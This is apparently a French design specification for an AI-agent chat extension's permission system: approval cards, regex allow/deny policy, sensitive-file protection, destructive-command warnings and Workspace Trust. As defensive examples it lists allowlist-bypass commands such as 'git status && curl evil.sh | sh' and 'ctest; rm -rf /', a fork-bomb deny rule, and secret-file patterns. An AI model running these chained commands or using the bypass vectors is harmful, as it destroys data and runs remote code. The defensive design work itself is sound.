# C07 — Permissions, approbations, sûreté

> **Contexte** : la carte de confirmation actuelle dit « The agent wants to run an
> action flagged as risky. Allow it? » — **sans dire laquelle**. C'est une
> demande d'autorisation à l'aveugle : soit l'utilisateur clique Allow par réflexe
> (la protection ne sert à rien), soit il clique Reject par prudence (l'agent ne
> peut rien faire). Les deux issues sont mauvaises.
>
> Par ailleurs `ConfirmRisky()` déclenche une analyse de risque coûteuse — sur ce
> 30B local, un tour trivial peut dépasser 600 s (AgenticEnv WP08c §7). Un régime
> d'allowlist bien conçu n'est donc pas un confort : c'est ce qui rend l'atelier
> utilisable.

**Fichiers à lire** : ce fichier · [00-PRIMER.md](../00-PRIMER.md) §2 (P2), §5 ·
[03-PROTOCOL.md](../03-PROTOCOL.md) §2 · [C05-tool-rendering.md](C05-tool-rendering.md) ·
[C04-context-providers.md](C04-context-providers.md) §2 (`ignore`)

**Dépend de** : C01, C05. **Bloque** : C09. **Parallélisable avec** : C06.

**Items du catalogue** : 28 (exécution d'un bloc de commande), 42 (sortie terminal
streamée), 57 (approbation avec la commande exacte, éditable), 58 (allowlist /
denylist par regex, persistée), 59 (modes d'auto-approbation), 60 (protection des
fichiers sensibles), 107 (Workspace Trust), 114 (avertissement destructif).

---

## 1. Carte d'approbation informative (item 57)

`pending_action` (03-PROTOCOL §2.3) porte enfin de quoi décider :

```
⚠  The agent wants to run a command
   $ rm -rf build && cmake -B build -DCMAKE_BUILD_TYPE=Release
   in /workspace/project

   ⛔ contains `rm -rf` — destructive

   [ Allow once ]  [ Allow always ]  [ Edit… ]  [ Reject ]
```

| `kind` | Ce qui est montré |
|---|---|
| `command` | la commande **exacte**, le répertoire de travail, les motifs dangereux surlignés |
| `edit` | le chemin + un diff compact du changement proposé |
| `network` | l'URL ou l'hôte visé |
| `other` | le résumé fourni par le bridge, jamais reformulé par le client |

| Règle |
|---|
| **Jamais de carte sans charge utile.** Si `pending_action` manque (bridge v1), afficher « the bridge did not say which action » — l'aveu est préférable à une fausse assurance. |
| « Edit… » permet de modifier la commande avant de l'autoriser. La commande modifiée repart telle quelle, sans réécriture par le client. |
| « Allow always » demande une **portée** : cette session, ou ce dossier (persisté). Jamais « global ». |
| Le focus clavier arrive sur **Reject**, pas sur Allow. On ne fait pas de l'autorisation le geste par défaut. |
| La carte n'a pas de timeout et ne se ferme jamais toute seule. |

## 2. Politique (items 58, 59)

```ts
// permissions/policy.ts
export type Decision =
  | { verdict: "allow"; rule: string }
  | { verdict: "ask";  reason: string }
  | { verdict: "deny"; rule: string };

export function evaluate(action: PendingAction, policy: Policy): Decision;
```

```jsonc
// agenticenvChat.permissions (réglage, fusionné workspace > user)
{
  "mode": "ask",                 // "ask" | "autoEdit" | "autoAll" | "readOnly"
  "allow": ["^git (status|diff|log)\\b", "^ctest\\b", "^cmake --build\\b"],
  "deny":  ["\\brm\\s+-rf\\b", "\\bgit\\s+push\\b", ":\\(\\)\\{.*\\};:"],
  "denyPaths": ["**/.env*", "**/*.pem", "**/id_rsa*"]
}
```

| Mode | Sémantique |
|---|---|
| `ask` (défaut) | tout ce qui n'est pas dans `allow` demande |
| `autoEdit` | les éditions de fichiers passent, les commandes demandent |
| `autoAll` | tout passe **sauf** `deny` — équivalent « YOLO », avec bannière permanente d'avertissement dans le panneau |
| `readOnly` | aucune écriture ni commande n'est autorisée (utile pour explorer un dépôt inconnu) |

| Règle |
|---|
| **`deny` gagne toujours sur `allow`**, quel que soit le mode. Un mode ne peut pas désarmer une denylist. |
| Les regex sont évaluées sur la commande **normalisée** (espaces réduits), jamais sur une version reconstruite. |
| Une regex invalide est ignorée avec un `notice` nommant la règle — elle ne fait pas planter l'évaluation, et elle ne devient surtout pas un « allow » par défaut. |
| L'évaluation vit **côté hôte** (P2) : une webview compromise ne doit pas pouvoir s'auto-autoriser. |
| Chaque décision automatique est **journalisée** dans l'OutputChannel avec la règle appliquée, et visible dans le fil (« auto-allowed by rule `^ctest\b` »). Une autorisation invisible n'est pas une autorisation. |

## 3. Contournement d'allowlist — le piège à ne pas ignorer

Une allowlist par regex sur une chaîne shell est **contournable** :
`ctest; rm -rf /`, `git status && curl evil.sh | sh`, substitutions,
`eval "$(...)"`.

| Mesure |
|---|
| Avant d'appliquer une règle `allow`, détecter les **enchaînements** : `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `>>`, `&`. Une commande qui en contient **ne peut pas être auto-autorisée**, même si son préfixe correspond. Elle passe en `ask`. |
| Cette règle est non désactivable en mode `ask` et `autoEdit`. En `autoAll`, elle reste appliquée à la denylist. |
| Test dédié avec au moins 15 vecteurs de contournement. |

> Le vrai confinement est le sandbox Docker, pas cette allowlist. Cette règle
> existe pour éviter les accidents et les surprises, pas pour arrêter un
> attaquant — et la documentation doit le dire honnêtement.

## 4. Fichiers sensibles (item 60)

| Règle |
|---|
| Les motifs de `denyPaths` (plus la liste de C04 §2 `ignore`) déclenchent une confirmation modale **nommant le fichier** quand l'agent veut le lire ou l'écrire. |
| Jamais auto-approuvé, quel que soit le mode — `autoAll` compris. |
| Si le contenu d'un fichier sensible apparaît malgré tout dans une sortie d'outil, l'affichage le masque (`****`) avec un bouton « reveal » explicite. |
| Cette protection est **best effort** et documentée comme telle. |

## 5. Commandes destructrices (item 114)

Surlignage et avertissement — sans bloquer, l'utilisateur reste souverain :

| Motif | Message |
|---|---|
| `rm -rf`, `rm -r` | suppression récursive |
| `git reset --hard`, `git clean -fd` | perte de modifications non commitées |
| `git push --force` | réécriture d'historique distant |
| `> fichier` sur un fichier suivi | écrasement |
| `dd`, `mkfs`, `chmod -R 777` | opération système |
| `curl … \| sh`, `wget … \| bash` | exécution de code distant |

L'avertissement est **factuel** (« ceci supprime récursivement `build/` »), pas
alarmiste.

## 6. Exécution depuis le fil (items 28, 42)

Le bouton « Run » d'un bloc de code `bash` (C02 §3) :

| Règle |
|---|
| Passe par `evaluate()` comme n'importe quelle action de l'agent. Un raccourci d'UI ne contourne pas la politique. |
| S'exécute dans un terminal VS Code nommé (`AgenticEnv Chat`), distinct du terminal de service `AgenticEnv` du panneau Components. |
| S'exécute **sur l'hôte**, pas dans le sandbox — c'est une différence de contexte majeure : le dire dans le tooltip (« runs on your machine, not in the sandbox »). |
| La sortie est capturée via la shell integration si disponible (voir C04 `[À CONFIRMER]`) et rattachée au fil (item 42) ; sinon le terminal reste la seule vue et l'UI le dit. |

## 7. Workspace Trust (item 107)

| Règle |
|---|
| `capabilities.untrustedWorkspaces: { supported: "limited" }` dans `package.json`. |
| Dossier non fiable ⇒ mode forcé `readOnly`, `start_session` refusé, panneau expliquant pourquoi avec le bouton natif « Trust folder ». |
| Les fichiers de prompts et d'instructions du dépôt (C10) **ne sont pas chargés** dans un dossier non fiable : ce sont des instructions exécutables par procuration. |

## 8. Tests

| Test | Attendu |
|---|---|
| `policy.test.ts` | matrice complète mode × allow × deny ; `deny` gagne toujours |
| Contournement | ≥ 15 vecteurs (`;`, `&&`, `|`, backticks, `$()`, `eval`, redirections) ⇒ jamais auto-autorisés |
| Regex invalide | ignorée + notice ; jamais interprétée comme allow |
| Chemins sensibles | `.env` ⇒ confirmation modale même en `autoAll` |
| Persistance | « Allow always (workspace) » survit au reload ; portée session oubliée à la nouvelle session |
| Carte | focus initial sur Reject ; « Edit… » n'altère pas la commande |
| Bridge v1 | carte sans charge utile ⇒ message honnête, pas de fausse description |
| Trust | dossier non fiable ⇒ readOnly, aucun chargement d'instructions |
| Journalisation | toute auto-approbation apparaît dans le fil **et** dans l'OutputChannel |

## 9. Critères d'acceptation

- [x] `ConfirmCard` informative : commande exacte + cwd, diff pour une édition, `Edit…`, `Allow always…` (session/folder). Focus initial sur **Reject**, aucun timeout. Sans charge utile (v1) → « the bridge did not say which action ». **`[À CONFIRMER]` tranché** : le client **synthétise** la carte depuis le dernier `ActionEvent` — ce n'est pas simuler l'état du bridge (P1), c'est présenter ce qu'on a vu passer ; `blind: true` sinon.
- [x] `deny` gagne toujours (testé sur les 3 modes) ; `deny` par défaut inclut `rm -rf`, `git push --force`, fork bomb.
- [x] 16 vecteurs de contournement (`;`, `&&`, `|`, `` ` ``, `$(`, `>`, `>>`, `&`, `\n`, `eval`, `#`…) → jamais `allow` (`CHAIN_CHARS`, test dédié).
- [x] Regex invalide → `invalidRules` → `notice`, jamais `allow`.
- [x] Auto-décision visible dans le fil (item `permission` « auto-allowed by rule … ») **et** dans l'OutputChannel (`logDecision`).
- [x] `.env` / `denyPaths` → `ask` même en `autoAll`.
- [x] `autoAll` → bannière `perm-yolo` permanente non-dismissible.
- [x] Run : passe par `evaluate()` (même politique que l'agent), s'exécute **sur l'hôte** (tooltip + prompt modal « Run on YOUR machine, not the sandbox »).
- [x] Workspace Trust : `capabilities.untrustedWorkspaces: "limited"` ; dossier non fiable → `readOnly` forcé, `startSession` refusé avec explication.
- [x] Doc honnête : `package.json` et ce fichier disent que l'allowlist protège des **accidents**, pas d'un attaquant — le vrai confinement est le sandbox Docker.
- [x] 207 tests (matrice de politique, 16 vecteurs, destructif, synthèse, état).
- [ ] **Persistance workspace** : « Allow always (workspace) » écrit dans `workspaceState` — round-trip réel à confirmer en F5.
- [ ] Le `pending_action`/`confirm_action{edited_command}` côté bridge reste à faire (marqué `CLIENT_AHEAD`) ; en v1 l'`edited_command` part mais le bridge doit l'honorer.
